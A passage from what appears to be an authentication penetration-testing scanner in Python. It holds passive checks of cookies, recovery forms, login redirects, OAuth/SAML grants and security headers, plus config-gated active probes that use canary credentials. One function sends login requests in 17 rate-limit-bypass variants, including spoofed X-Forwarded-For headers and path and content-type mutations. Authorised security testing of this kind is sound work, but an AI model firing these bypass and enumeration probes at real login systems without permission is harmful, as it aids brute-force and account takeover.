                 if hints.search(urllib.parse.urlparse(u).path)][:cap]
        for u in cands:
            meta["probes_total"] = meta.get("probes_total", 0) + 2
            sc_counts, statuses = [], []
            for _i in range(2):
                r = http.get(u, allow_redirects=False)
                if r is None:
                    sc_counts.append(None)
                    statuses.append(None)
                    continue
                n = len([1 for k, _v in (r.headers.items()
                                         if r.headers else [])
                         if str(k).lower() == "set-cookie"])
                sc_counts.append(n)
                statuses.append(r.status)
            stable = (sc_counts[0] is not None and
                      sc_counts[0] == sc_counts[1])
            out["probe_rows"].append({
                "url": u, "status": statuses, "set_cookie_counts": sc_counts,
                "stable_shape": stable,
                "verdict": "INFO" if stable else "NOISE",
                "note": "2-sequential GET persistence shape (INERT)"})
    out["summary"] = {"persistent_cookies": len(out["rows"]),
                      "suspected": sum(1 for r in out["rows"]
                                       if r["verdict"] == "SUSPECTED"),
                      "gated_probes": len(out["probe_rows"])}
    return out


def session_property_matrix(cookie_report, hard_report):
    """Stage X (passive, 0-req): per-cookie property matrix - Secure/HttpOnly/
    SameSite/prefix/scope + posture summary."""
    out = {"rows": [], "summary": {}}
    for u, cookies in (cookie_report or {}).items():
        for c in (cookies if isinstance(cookies, list) else []):
            flags = c.get("flags") or {}
            gaps = list(c.get("missing") or []) +                 list(c.get("prefix_violations") or [])
            out["rows"].append({
                "endpoint": u, "name": c.get("name"),
                "secure": bool(flags.get("secure")),
                "httponly": bool(flags.get("httponly")),
                "samesite": flags.get("samesite_value") or
                ("set" if flags.get("samesite") else "absent"),
                "prefix": ("__Host-" if str(c.get("name", "")).startswith(
                    "__Host-") else "__Secure-" if str(c.get("name", "")).startswith(
                        "__Secure-") else None),
                "scope": c.get("cookie_scope"),
                "gaps": gaps,
                "verdict": "SUSPECTED" if gaps else "HARDENED"})
    ssn = [r for r in out["rows"]
           if str(r.get("samesite")).lower() == "none" and not r["secure"]]
    out["summary"] = {"cookies": len(out["rows"]),
                      "hardened": sum(1 for r in out["rows"]
                                      if r["verdict"] == "HARDENED"),
                      "suspected": sum(1 for r in out["rows"]
                                       if r["verdict"] == "SUSPECTED"),
                      "samesite_none_no_secure": len(ssn)}
    return out


# ===========================================================================
# P21 v23 STAGE Y - RECOVERY/KBA CENSUS + LOGIN SEQUENCING CENSUS
# ===========================================================================
def recovery_census(http, live, meta, conf):
    """Stage Y: recovery/backup-code/KBA surface census (passive) + RoE-gated
    canary-GET reflection shape (read-only, cap 2)."""
    out = {"rows": [], "probe_rows": [], "gated": False, "summary": {}}
    for u, rec in (live or {}).items():
        if not RECOVERY_PATH_RE.search(urllib.parse.urlparse(u).path):
            continue
        forms_txt = json.dumps(rec.get("forms") or [])[:4000]
        kba = sorted(set(m.group(0).lower() for m in
                         KBA_RE.finditer(forms_txt)))[:4]
        row = {"url": u, "shape": "recovery_path",
               "status": rec.get("status"), "kba_markers": kba}
        row["verdict"] = "SUSPECTED" if kba else "INFO"
        out["rows"].append(row)
        if kba:
            out["summary"]["kba_endpoints"] = \
                out["summary"].get("kba_endpoints", 0) + 1
    gate = bool(conf.get("auth23_allow_recovery_probe", False))
    out["gated"] = gate
    if gate and http is not None and out["rows"]:
        canary = _canary("rec")
        for r in out["rows"][:2]:
            u = r["url"]
            sep = "&" if "?" in u else "?"
            u2 = "%s%swaspP21_rec=%s" % (u, sep, canary)
            meta["probes_total"] = meta.get("probes_total", 0) + 1
            resp = http.get(u2, allow_redirects=False)
            reflected = bool(resp is not None and canary in (resp.text or ""))
            out["probe_rows"].append({
                "url": u, "status": resp.status if resp is not None else None,
                "canary_reflected": reflected,
                "verdict": "SUSPECTED" if reflected else "NOISE",
                "note": "canary recovery-param shape (read-only GET)"})
    out["summary"]["recovery_paths"] = len(out["rows"])
    return out


def login_sequencing_census(http, login_eps, live, meta, conf):
    """Stage Y: login-flow sequencing census (passive chain shapes) +
    RoE-gated stepwise redirect follow (GET-only, cap)."""
    out = {"rows": [], "probe_rows": [], "gated": False, "summary": {}}
    for u in (login_eps or []):
        rec = (live or {}).get(u) or {}
        chain = []
        if rec.get("forms"):
            chain.append("form")
        if rec.get("csrf_present"):
            chain.append("csrf")
        loc = rec.get("location")
        if loc:
            chain.append("redirect")
            try:
                lh = urllib.parse.urlparse(loc).netloc
                uh = urllib.parse.urlparse(u).netloc
                if lh and uh and lh != uh:
                    chain.append("external-redirect")
            except Exception:
                pass
        if rec.get("redirect_params"):
            chain.append("token-param")
        if rec.get("set_cookie"):
            chain.append("pre-auth-cookie")
        row = {"url": u, "chain": chain,
               "steps": len(chain),
               "verdict": "SUSPECTED" if "external-redirect" in chain
               else "INFO"}
        out["rows"].append(row)
    gate = bool(conf.get("auth23_allow_sequence_probe", False))
    out["gated"] = gate
    if gate and http is not None and login_eps:
        cap = max(1, int(conf.get("auth23_sequence_cap", 3)))
        for u in login_eps[:cap]:
            steps, cur, hops = [], u, 0
            while cur and hops < cap:
                meta["probes_total"] = meta.get("probes_total", 0) + 1
                r = http.get(cur, allow_redirects=False)
                if r is None:
                    steps.append("error")
                    break
                steps.append("%s:%s" % (r.status, path_only(cur)))
                loc = r.header("Location")
                if not loc or r.status not in (301, 302, 303, 307, 308):
                    break
                cur = urllib.parse.urljoin(cur, loc)
                hops += 1
            out["probe_rows"].append({
                "url": u, "hops": hops, "steps": steps,
                "verdict": "SUSPECTED" if hops >= cap else "INFO",
                "note": "stepwise GET redirect chain (read-only)"})
    out["summary"] = {"logins": len(out["rows"]),
                      "external_redirect": sum(
                          1 for r in out["rows"]
                          if "external-redirect" in (r.get("chain") or [])),
                      "gated_probes": len(out["probe_rows"])}
    return out


# ===========================================================================
# P21 v23 STAGE Z - SSO GRANT MATRIX + TOKEN BINDING + HEADER POSTURE
# ===========================================================================
def sso_grant_matrix(oauth_report, oauth_deep, saml_report, saml_deep, live):
    """Stage Z (passive, 0-req): OAuth grant-type x response-mode matrix +
    SAML binding matrix + risk flags (implicit/password grant shapes)."""
    out = {"rows": [], "summary": {}, "enabled": True}
    docs = []
    for u, doc in ((oauth_report or {}).get("documents") or {}).items():
        if isinstance(doc, dict) and doc:
            docs.append(("oidc_doc:%s" % u, doc))
    for r in (oauth_deep or {}).get("rows", []):
        if r.get("doc") and isinstance(r.get("doc"), dict):
            docs.append(("deep_doc:%s" % (r.get("url") or "-"), r["doc"]))
    for src, doc in docs:
        grants = [str(g).lower() for g in
                  (doc.get("grant_types_supported") or [])] or []
        rts = [str(t).lower() for t in
               (doc.get("response_types_supported") or [])] or []
        modes = [str(m).lower() for m in
                 (doc.get("response_modes_supported") or [])] or []
        risk = []
        if any(g in grants or g in " ".join(rts) for g in SSO_RISK_GRANTS):
            risk.append("implicit_or_password_grant_shape")
        if "id_token" in rts or "id_token token" in rts:
            risk.append("id_token_response_type")
        if not grants and not rts:
            risk.append("no_explicit_grant_list")
        out["rows"].append({"source": src, "grants": grants[:6],
                            "response_types": rts[:6],
                            "response_modes": modes[:4],
                            "risk_flags": risk,
                            "verdict": "SUSPECTED" if risk else "HARDENED"})
    # SAML bindings census (documented shapes)
    saml_rows = (saml_deep or {}).get("rows", []) or []
    if (saml_report or {}).get("detected") or saml_rows:
        binds = sorted({str(r.get("binding", "?")).lower()
                        for r in saml_rows if r.get("binding")})[:6]
        out["rows"].append({"source": "saml_bindings",
                            "grants": binds,
                            "response_types": [],
                            "response_modes": [],
                            "risk_flags": ["redirect_binding"] if
                            any("redirect" in b for b in binds) else [],
                            "verdict": "INFO"})
    out["summary"] = {"docs": len(out["rows"]),
                      "risky": sum(1 for r in out["rows"]
                                   if r.get("risk_flags"))}
    return out


def token_binding_census(http, jwt_report, oauth_deep, live, meta, conf):
    """Stage Z: token-binding/DPoP/mTLS indicator census (passive) +
    RoE-gated DPoP canary echo shape (read-only GET, cap 1)."""
    out = {"rows": [], "probe_rows": [], "gated": False, "summary": {}}
    hay = []
    for ji in (jwt_report or []):
        hay.append(json.dumps(ji, default=str)[:2000])
    for r in (oauth_deep or {}).get("rows", [])[:8]:
        hay.append(json.dumps(r, default=str)[:2000])
    for u, rec in list((live or {}).items())[:12]:
        hay.append(json.dumps(rec.get("forms") or [], default=str)[:1500])
    seen = set()
    for h in hay:
        for m in TOKEN_BINDING_MARKERS_RE.finditer(h):
            tok = m.group(0).lower().strip()
            if tok not in seen:
                seen.add(tok)
                out["rows"].append({"marker": tok,
                                    "verdict": "INFO",
                                    "note": "token-binding indicator shape"})
    gate = bool(conf.get("auth23_allow_binding_probe", False))
    out["gated"] = gate
    if gate and http is not None:
        jwks = ((oauth_deep or {}).get("jwks") or {}).get("url")
        target = jwks or next((u for u in live if "discovery" in u or
                               "jwks" in u), None)
        if target:
            meta["probes_total"] = meta.get("probes_total", 0) + 1
            dpop_canary = _canary("dpop")
            r = http.get(target, allow_redirects=False,
                         headers={"DPoP": dpop_canary})
            echoed = bool(r is not None and dpop_canary in
                          json.dumps(dict(r.headers.items()
                                          if r.headers else []),
                                     default=str))
            out["probe_rows"].append({
                "url": target, "dpop_echoed": echoed,
                "verdict": "SUSPECTED" if echoed else "HARDENED",
                "note": "DPoP canary header echo shape (read-only)"})
    out["summary"] = {"indicators": len(out["rows"]),
                      "gated_probes": len(out["probe_rows"])}
    return out


def auth_header_posture_census(live):
    """Stage Z (passive, 0-req): per-auth-endpoint security-header posture
    matrix - HSTS/CSP/Referrer/XCTO/COOP/CORP/COEP/Permissions 8-point."""
    out = {"rows": [], "summary": {}}
    for u, rec in (live or {}).items():
        h = rec.get("hardening") or {}
        present = []
        missing = []
        for name in SECURITY_HEADER_SET:
            val = h.get(name) or h.get(name.replace("-", "_"))
            if val:
                present.append(name)
            else:
                missing.append(name)
        score = len(present)
        verdict = ("WEAK" if score <= 2 else
                   "MODERATE" if score <= 5 else "STRONG")
        out["rows"].append({"url": u, "present": present,
                            "missing": missing, "posture_score": score,
                            "max": len(SECURITY_HEADER_SET),
                            "verdict": verdict})
    out["summary"] = {"endpoints": len(out["rows"]),
                      "weak": sum(1 for r in out["rows"]
                                  if r["verdict"] == "WEAK"),
                      "median_score": (sorted(r["posture_score"] for r in
                                              out["rows"])[len(out["rows"])
                                                       // 2]
                                       if out["rows"] else 0)}
    return out

# ===========================================================================
# P21 STAGE F - ENUM ORACLE LADDER CLASSIFIER (v10 enum results -> ladder)
# ===========================================================================
def enum_oracle_classify(enum_rows, conf):
    """v10 enum_login_endpoint ke raw differentials ko 7-shape ladder me
    classify karta hai: status/size/time/body-shape/error-code/DRF-fp/generic.
    Sab shapes canary identifiers par (koi REAL user enumeration nahi)."""
    out = {"ladder": [], "confirmed_shapes": {}, "max_cap":
           int(conf.get("auth_enum_ladder_max", 6))}
    for r in (enum_rows or [])[:out["max_cap"]]:
        shapes = []
        sig = r.get("signals") or {}
        # v10 live keys pehle
        if sig.get("message_oracle"):
            shapes.append("status_diff")
        if sig.get("json_oracle"):
            shapes.append("error_code_diff")
        if sig.get("best_drf"):
            shapes.append("drf_shape_fingerprint")
        if sig.get("generic_message_ok"):
            shapes.append("generic_message_override")
        t = r.get("timing") or {}
        if t.get("timing_anomaly") or t.get("verdict") in ("DIFFERENT",
                                                           "SUSPECTED"):
            shapes.append("time_diff")
        # legacy/unit keys fallback
        if not shapes:
            if r.get("status_diff"):
                shapes.append("status_diff")
            if r.get("size_diff") or r.get("len_diff"):
                shapes.append("size_diff")
            if r.get("time_verdict") in ("DIFFERENT", "SUSPECTED"):
                shapes.append("time_diff")
            if r.get("shape_diff") or r.get("json_shape_diff"):
                shapes.append("body_shape_diff")
            if r.get("error_code_diff"):
                shapes.append("error_code_diff")
            if r.get("drf_shape"):
                shapes.append("drf_shape_fingerprint")
            if r.get("generic_message"):
                shapes.append("generic_message_override")
        verdict = ("CONFIRMED" if {"status_diff", "error_code_diff",
                                   "drf_shape_fingerprint"} & set(shapes)
                   else "SUSPECTED" if shapes else "HARDENED")
        row = {"endpoint": r.get("endpoint") or r.get("url"),
               "shapes": shapes, "verdict": verdict}
        out["ladder"].append(row)
        for s in shapes:
            out["confirmed_shapes"][s] = out["confirmed_shapes"].get(s, 0) + 1
    return out


# ===========================================================================
# P21 STAGE I - MFA DEEP CENSUS (entropy + replay shape + backup codes)
# ===========================================================================
def mfa_deep_census(mfa_report, meta, conf):
    """v10 mfa_flow_analysis ke upar v22 deep layer:
      - OTP field shape + entropy hint (offline)
      - replay shape: DOCUMENTED (RoE-gated 2-sequential resubmit)
      - backup-code space census from form markers
      - MFA-fatigue signals DOCUMENTED-ONLY"""
    out = {"gated_replay": False, "rows": [], "entropy": [],
           "playbooks": [n for n, _ in DOCUMENTED_MFA_TECHNIQUES]}
    for ep, rec in (mfa_report or {}).items():
        row = {"endpoint": ep, "status_oracle": rec.get("status_oracle"),
               "json_oracle": rec.get("json_oracle"),
               "otp_shape": rec.get("otp_shape"),
               "rate_limited": bool(rec.get("no_ratelimit")),
               "lockout": rec.get("locked_out")}
        shape = rec.get("otp_shape") or {}
        lengths = set()
        if shape.get("maxlength"):
            try:
                lengths.add(int(shape["maxlength"]))
            except Exception:
                pass
        if shape.get("pattern"):
            m = re.search(r"\{(\d+)\}", str(shape["pattern"]))
            if m:
                lengths.add(int(m.group(1)))
        if lengths:
            mx = max(lengths)
            out["entropy"].append({"endpoint": ep, "max_len": mx,
                                   "otp_space_hint": 10 ** mx,
                                   "verdict": "SUSPECTED" if mx <= 4
                                   else "HARDENED"})
        out["rows"].append(row)
    if conf.get("auth_allow_mfa_replay_probe", False):
        out["gated_replay"] = True
        out["replay_note"] = ("RoE gate ON - 2-SEQUENTIAL canary resubmit "
                              "census (hard cap 2, sequential, canary-only) "
                              "run() stage I me execute hota hai")
    else:
        out["replay_note"] = ("RoE gate OFF (auth_allow_mfa_replay_probe) -> "
                              "replay shape documented-only")
    return out


# ===========================================================================
# P21 STAGE G extension - BYPASS2 AUTH REQUEST-SHAPES (GATED, hard cap 17)
# ===========================================================================
def bypass2_auth_census(http, scope, login_url, live_rec, meta, conf):
    """17 request-shape variants rate-limit census ke liye (canary creds only).
    GATED: auth_allow_bypass2_matrix (default OFF). Ek variant = MAX 1 request.
    Baseline 1 canary request, phir variants - total <= 18 requests hard cap."""
    out = {"gated": True, "ran": False, "baseline": None, "rows": [],
           "cap": int(conf.get("auth_bypass2_cap", 17)),
           "techniques": [{"name": n, "mutation": m, "class": c}
                          for n, m, c in BYPASS2_AUTH_SHAPES]}
    if not conf.get("auth_allow_bypass2_matrix", False):
        out["note"] = ("RoE gate OFF (auth_allow_bypass2_matrix) -> "
                       "documented-only: 17 request-shape variants list")
        return out
    out["ran"] = True
    canary_user = CANARY_EMAIL
    canary_pass = _canary("pw")
    # baseline
    meta["probes_total"] = meta.get("probes_total", 0) + 1
    rb = http.request("POST", login_url,
                      data={"username": canary_user, "password": canary_pass},
                      allow_redirects=False, read_only_post=True)
    if rb is not None:
        out["baseline"] = {"status": rb.status, "len": len(rb.body or "")}
    sp = urllib.parse.urlsplit(login_url)
    n = 0
    for name, mutation, cls in BYPASS2_AUTH_SHAPES:
        if n >= out["cap"]:
            break
        n += 1
        url = login_url
        headers = {}
        data = {"username": canary_user, "password": canary_pass}
        method = "POST"
        if name == "xff_spoof":
            headers["X-Forwarded-For"] = "203.0.113.%d" % random.randint(2, 250)
        elif name == "xff_rotate":
            headers["X-Forwarded-For"] = "203.0.113.%d.%d" % (
                random.randint(2, 250), random.randint(2, 250))
        elif name == "real_ip":
            headers["X-Real-IP"] = "203.0.113.%d" % random.randint(2, 250)
        elif name == "host_case":
            url = urllib.parse.urlunsplit((sp.scheme,
                                           sp.netloc.swapcase(), sp.path,
                                           sp.query, ""))
        elif name == "path_case":
            url = urllib.parse.urlunsplit((sp.scheme, sp.netloc,
                                           sp.path.swapcase(), sp.query, ""))
        elif name == "path_dot":
            url = urllib.parse.urlunsplit((sp.scheme, sp.netloc,
                                           sp.path.replace("//", "/./", 1),
                                           sp.query, ""))
        elif name == "path_double":
            url = urllib.parse.urlunsplit((sp.scheme, sp.netloc,
                                           "/" + sp.path, sp.query, ""))
        elif name == "url_encode":
            url = urllib.parse.urlunsplit((sp.scheme, sp.netloc,
                                           urllib.parse.quote(sp.path, safe=""),
                                           sp.query, ""))
        elif name == "param_padding":
            url = urllib.parse.urlunsplit((sp.scheme, sp.netloc, sp.path,
                                           "p=%s&%s" % (_canary("pad"), sp.query), ""))
        elif name == "verb_alt":
            method = "HEAD"
        elif name == "ct_flip":
            headers["Content-Type"] = "application/json"
            data = json.dumps(data)
        elif name == "charset_tail":
            headers["Content-Type"] = "application/x-www-form-urlencoded; charset=utf-7"
        elif name == "body_wrap":
            headers["Content-Type"] = "application/json"
            data = json.dumps([data])
        elif name == "dup_header":
            headers["X-Dup-Canary"] = _canary("dup")
            headers["X-Dup-Canary"] = _canary("dup2")
        elif name == "http2_hint":
            headers["X-HTTP2-Canary"] = _canary("h2")
        elif name == "sess_rollover":
            headers["X-Session-Canary"] = _canary("sr")
        elif name == "combo_chain":
            headers["X-Forwarded-For"] = "203.0.113.9"
            url = urllib.parse.urlunsplit((sp.scheme, sp.netloc,
                                           sp.path.upper().swapcase(),
                                           sp.query, ""))
        meta["probes_total"] = meta.get("probes_total", 0) + 1
        try:
            r = http.request(method, url, headers=headers, data=data,
                             allow_redirects=False, read_only_post=True)
        except Exception:
            continue
        if r is None:
            continue
        b = len(r.body or "")
        nontrivial = bool(out["baseline"] and
                          r.status != out["baseline"]["status"])
        out["rows"].append({"variant": name, "class": cls, "status": r.status,
                            "len": b, "nontrivial": nontrivial,
                            "verdict": "SUSPECTED" if nontrivial else "NOISE"})
        if nontrivial:
            break   # pehla win kaafi hai - budget bachao
    return out


def harvest_oauth_tokens(live):
    """Pre-auth OAuth/id_token harvest (offline) - authorization responses
    aur fragment shapes se token-shaped strings nikalta hai (INERT)."""
    toks = []
    for u, r in (live or {}).items():
        for t in (r.get("jwts") or []):
            toks.append(t)
    return toks[:8]


def privileged_targets_from_ff(base_dir, scope, results):
    """P20 feedforward (to_phase21_authz.logic_privileged_targets) + P11 idor
    + P7 authz-hints -> merged privileged target list (dedup, cap 12)."""
    ff = read_feedforward_safe(os.path.join(base_dir, scope.engagement))
    pts = []
    seen = set()
    for t in (_deep_get(ff, "logic", "to_phase21_authz", "logic_privileged_targets") or []):
        if isinstance(t, str) and t not in seen:
            seen.add(t)
            pts.append(t)
    for t in (_deep_get(ff, "access", "to_phase21_authz", "targets") or []):
        if isinstance(t, str) and t not in seen:
            seen.add(t)
            pts.append(t)
    for t in (_deep_get(ff, "js", "to_phase21_authz", "admin_paths") or []):
        if isinstance(t, str) and t not in seen:
            seen.add(t)
            pts.append(t)
    return pts[:12]


# ===========================================================================
# P21 STAGE S - VERDICT ENGINE (6-class ladder, P12..P20 v22 pattern)
# CONFIRMED > SUSPECTED > HARDENED > NOISE > INFO > GATED
# ===========================================================================
def _vrow(key, target, verdict, stage, signals, note=""):
    return {"key": key, "target": target, "verdict": verdict,
            "stage": stage, "signals": signals[:6], "note": note[:200]}


def verdict_engine(results, meta, conf):
    """Sab P21 stages ke signals -> 6-class verdict rows."""
    rows = []

    # ---- enum ladder (Stage F) ----
    for r in (results.get("enum_ladder") or {}).get("ladder", []):
        if r.get("verdict") in ("CONFIRMED", "SUSPECTED"):
            rows.append(_vrow("enum_ladder_confirmed", r.get("endpoint", ""),
                              r["verdict"], "enum_ladder",
                              r.get("shapes", []),
                              "response differential shapes"))

    # ---- rate-limit / lockout (Stage G) ----
    for u, r in (results.get("rl_report") or {}).items():
        if not r.get("throttled"):
            rows.append(_vrow("no_rate_limit", u, "CONFIRMED", "rate_limit",
                              ["no_throttle"], "brute-force surface open"))
        elif (r.get("bypass_matrix") or {}).get("bypass_likely"):
            rows.append(_vrow("lockout_bypass", u, "CONFIRMED", "rate_limit",
                              [r["bypass_matrix"].get("bypass_type", "?")]))
        else:
            rows.append(_vrow("rate_limited", u, "HARDENED", "rate_limit",
                              ["throttle_observed"]))
        if r.get("lockout_model") not in (None, "none"):
            rows.append(_vrow("lockout_model_%s" % r.get("lockout_model"),
                              u, "INFO", "rate_limit", ["model_classified"]))

    # ---- bypass2 (Stage G v22) ----
    for r in (results.get("bypass2") or {}).get("rows", []):
        if r.get("nontrivial"):
            rows.append(_vrow("bypass2_shape_win", r.get("target", ""),
                              "SUSPECTED", "bypass2",
                              ["shape:%s" % r.get("variant")]))

    # ---- reset flow (Stage H) ----
    for u, r in (results.get("reset_report") or {}).items():
        if r.get("host_header_reflected"):
            rows.append(_vrow("reset_host_header", u, "CONFIRMED",
                              "reset", ["host_header_injection"]))
        if (r.get("token") or {}).get("weak"):
            rows.append(_vrow("reset_token_weak", u, "CONFIRMED", "reset",
                              ["entropy_low"]))
        if r.get("enumeration_likely"):
            rows.append(_vrow("reset_enumeration", u, "SUSPECTED", "reset",
                              ["existence_leak"]))

    # ---- MFA deep (Stage I) ----
    for r in (results.get("mfa_deep") or {}).get("rows", []):
        if r.get("status_oracle") or r.get("json_oracle"):
            rows.append(_vrow("mfa_status_oracle", r.get("endpoint", ""),
                              "CONFIRMED", "mfa_deep", ["state_leak"]))
        if r.get("rate_limited"):
            rows.append(_vrow("mfa_rate_limited", r.get("endpoint", ""),
                              "HARDENED", "mfa_deep", ["throttle"]))
    for e in (results.get("mfa_deep") or {}).get("entropy", []):
        if e.get("verdict") == "SUSPECTED":
            rows.append(_vrow("mfa_entropy_weak", e.get("endpoint", ""),
                              "SUSPECTED", "mfa_deep",
                              ["otp_len:%s" % e.get("max_len")]))

    # ---- OAuth deep (Stage J) ----
    for r in (results.get("oauth_deep") or {}).get("rows", []):
        if r.get("verdict") == "SUSPECTED":
            miss = [k for k in ("pkce", "state", "nonce")
                    if r.get(k) == "absent"]
            key = ("oauth_pkce_absent" if "pkce" in miss else
                   "oauth_state_absent" if "state" in miss else
                   "oauth_nonce_absent")
            rows.append(_vrow(key, r.get("url", ""), "SUSPECTED",
                              "oauth_deep", ["absent:%s" % m for m in miss]))
        elif r.get("verdict") == "HARDENED":
            rows.append(_vrow("oauth_hardened", r.get("url", ""),
                              "HARDENED", "oauth_deep", ["pkce+state"]))
    for r in (results.get("oauth_deep") or {}).get("id_tokens", []):
        if r.get("roles_present") or not r.get("exp_present"):
            rows.append(_vrow("oauth_idtoken_claims", r.get("iss", "-"),
                              "SUSPECTED", "oauth_deep",
                              ["roles" if r.get("roles_present") else
                               "no_exp"]))
    if (results.get("oauth_deep") or {}).get("jwks", {}).get("cache_control") \
            and "no-store" not in str((results.get("oauth_deep") or {})
                                      .get("jwks", {}).get("cache_control", "")).lower():
        rows.append(_vrow("oauth_jwks_cacheable", (results["oauth_deep"]["jwks"]
                                                   or {}).get("url", "-"),
                          "INFO", "oauth_deep", ["jwks_cacheable"]))

    # ---- OAuth error shape ----
    if (results.get("oauth_err") or {}).get("differential"):
        rows.append(_vrow("oauth_error_shape",
                          (results.get("oauth_err") or {}).get("url", "-"),
                          "SUSPECTED", "oauth_err", ["error_shape_diff"],
                          "client existence oracle"))

    # ---- OAuth variants (Stage K) ----
    for r in (results.get("oauth_variants") or {}).get("rows", []):
        if r.get("verdict") == "CONFIRMED":
            rows.append(_vrow("oauth_variant_accepted", r.get("url", ""),
                              "CONFIRMED", "oauth_variants",
                              ["shape:%s" % r.get("shape")]))

    # ---- SAML (Stage L) ----
    for r in (results.get("saml_deep") or {}).get("rows", []):
        if r.get("metadata_open"):
            rows.append(_vrow("saml_metadata_open", r.get("url", ""), "INFO",
                              "saml_deep", ["metadata_public"]))
        if not r.get("signed_assertion_hint"):
            rows.append(_vrow("saml_unsigned_hint", r.get("url", ""),
                              "SUSPECTED", "saml_deep", ["unsigned_hint"]))

    # ---- authz matrix (Stage M) ----
    for r in (results.get("authz_matrix") or {}).get("vertical", []):
        if r.get("verdict") in ("CONFIRMED", "SUSPECTED"):
            rows.append(_vrow("authz_vertical_preauth", r.get("url", ""),
                              r["verdict"], "authz_matrix",
                              ["class:%s" % r.get("class")]))
    for r in (results.get("authz_matrix") or {}).get("horizontal", []):
        if r.get("verdict") in ("CONFIRMED", "SUSPECTED"):
            rows.append(_vrow("authz_horizontal_diff", r.get("url", ""),
                              r["verdict"], "authz_matrix",
                              ["canary_diff", "status_a:%s" % r.get("status_a"),
                               "status_b:%s" % r.get("status_b")]))

    # ---- header trust (Stage N) ----
    for r in (results.get("header_trust") or {}).get("rows", []):
        if r.get("verdict") == "CONFIRMED":
            key = ("header_original_url_echo" if "URL" in r.get("header", "")
                   else "header_xff_trusted")
            rows.append(_vrow(key, r.get("url", ""), "CONFIRMED",
                              "header_trust",
                              ["header:%s" % r.get("header")]))

    # ---- CORS / redirect (Stage O) ----
    for u, r in (results.get("cors_report") or {}).items():
        if r.get("reflected") and r.get("credentials"):
            rows.append(_vrow("cors_cred_reflection", u, "CONFIRMED",
                              "cors", ["origin_reflected"]))
        elif r.get("wildcard"):
            rows.append(_vrow("cors_wildcard", u, "SUSPECTED", "cors",
                              ["wildcard"]))
    for u, r in (results.get("redir_report") or {}).items():
        if r.get("open_redirect"):
            rows.append(_vrow("auth_open_redirect", u, "CONFIRMED",
                              "redirect", ["open_redirect"]))
        if r.get("crlf"):
            rows.append(_vrow("crlf_injection", u, "CONFIRMED", "redirect",
                              ["crlf"]))

    # ---- registration (Stage P) ----
    for u, r in (results.get("reg_report") or {}).items():
        if r.get("enumeration_likely"):
            rows.append(_vrow("registration_enumeration", u, "SUSPECTED",
                              "registration", ["existence_leak"]))
        if r.get("open_registration"):
            rows.append(_vrow("registration_open", u, "INFO", "registration",
                              ["open_signup"]))

    # ---- lifecycle (Stage Q) ----
    for r in (results.get("lifecycle") or {}).get("logout_state", []):
        if r.get("verdict") in ("SUSPECTED", "HARDENED"):
            rows.append(_vrow("sso_logout_live", r.get("url", ""),
                              r["verdict"], "lifecycle",
                              ["cookie_cleared:%s" % r.get("cookie_cleared")]))
    for r in (results.get("lifecycle") or {}).get("remember_me", []):
        if r.get("verdict") == "SUSPECTED":
            rows.append(_vrow("lifecycle_remember_predictable",
                              r.get("host", "-"), "SUSPECTED", "lifecycle",
                              ["entropy:%s" % r.get("entropy")]))

    # ---- policy / captcha (Stage R) ----
    for r in (results.get("policy_captcha") or {}).get("policy_rows", []):
        if r.get("weak_flags"):
            rows.append(_vrow("policy_min_length_weak", r.get("url", ""),
                              "SUSPECTED", "policy", r.get("weak_flags", [])))
    for r in (results.get("policy_captcha") or {}).get("anti_auto", []):
        rows.append(_vrow("captcha_absent_auth", r.get("url", ""),
                          "SUSPECTED", "policy", ["no_captcha_marker"]))

    # ---- JWT (Stage D) ----
    for ji in (results.get("jwt_report") or []):
        if ji.get("alg") == "none":
            rows.append(_vrow("jwt_alg_none_shape", ji.get("endpoint", "-"),
                              "SUSPECTED", "jwt", ["alg=none"]))
        if ji.get("kid") or ji.get("jku"):
            rows.append(_vrow("jwt_jku_shape", ji.get("endpoint", "-"),
                              "SUSPECTED", "jwt",
                              ["kid" if ji.get("kid") else "jku"]))
    for r in ((results.get("jwt_deep") or {}).get("confusion_candidates") or []):
        rows.append(_vrow("jwt_alg_confusion_candidate", r.get("endpoint", "-"),
                          "SUSPECTED", "jwt_deep", ["alg:%s" % r.get("alg")]))

    # ---- injection oracle (Stage E) ----
    for u, r in (results.get("inj_report") or {}).items():
        if r.get("nosql_accepted"):
            rows.append(_vrow("nosql_operator_accepted", u, "CONFIRMED",
                              "inject", ["nosql_accept"]))
        if r.get("type_confusion"):
            rows.append(_vrow("json_type_confusion", u, "SUSPECTED",
                              "inject", ["type_confusion"]))

    # ---- transport / cookies (Stage C) ----
    for u, r in (results.get("live") or {}).items():
        if _is_cleartext(u):
            rows.append(_vrow("cleartext_auth_transport", u, "CONFIRMED",
                              "transport", ["http_login"]))
    for u, cookies in (results.get("cookie_report") or {}).items():
        for c in (cookies if isinstance(cookies, list) else []):
            if c.get("missing"):
                rows.append(_vrow("cookie_flags_missing", u, "SUSPECTED",
                                  "transport", ["missing:%s" % c.get("name")]))

    # ---- privileged targets (Stage M info) ----
    for t in (results.get("privileged_targets") or [])[:6]:
        rows.append(_vrow("authz_privileged_target", t, "INFO",
                          "authz_matrix", ["feedforward:P20/P11/P7"]))

    # ---- v23 Stage W: password hygiene + stuffing posture ----
    for r in (results.get("pwd_hygiene") or {}).get("rows", []):
        if r.get("verdict") == "WEAK":
            rows.append(_vrow("pwd_hygiene_weak", r.get("url", "-"),
                              "SUSPECTED", "pwd_hygiene",
                              r.get("weak_flags", [])))
    for r in (results.get("stuffing_posture") or {}).get("rows", []):
        if r.get("verdict") in ("OPEN", "PARTIAL"):
            rows.append(_vrow("stuffing_posture_weak", r.get("url", "-"),
                              "SUSPECTED", "stuffing",
                              ["resistance:%s/6" % r.get("resistance")]))

    # ---- v23 Stage X: remember-me + session property matrix ----
    for r in (results.get("rememberme") or {}).get("rows", []):
        if r.get("verdict") == "SUSPECTED":
            rows.append(_vrow("rememberme_long_lived", r.get("host", "-"),
                              "SUSPECTED", "lifecycle",
                              ["lifetime:%s" % r.get("lifetime_bucket")]))
    for r in (results.get("session_props") or {}).get("rows", []):
        if r.get("verdict") == "SUSPECTED":
            rows.append(_vrow("session_property_gap",
                              r.get("endpoint", "-"), "SUSPECTED",
                              "session", (r.get("gaps") or [])[:4]))

    # ---- v23 Stage Y: recovery/KBA + login sequencing ----
    for r in (results.get("recovery") or {}).get("rows", []):
        if r.get("kba_markers"):
            rows.append(_vrow("recovery_kba_present", r.get("url", "-"),
                              "SUSPECTED", "recovery", ["kba_present"]))
    for r in (results.get("login_sequence") or {}).get("rows", []):
        if "external-redirect" in (r.get("chain") or []):
            rows.append(_vrow("login_sequence_gap", r.get("url", "-"),
                              "SUSPECTED", "sequence",
                              ["external_redirect"]))

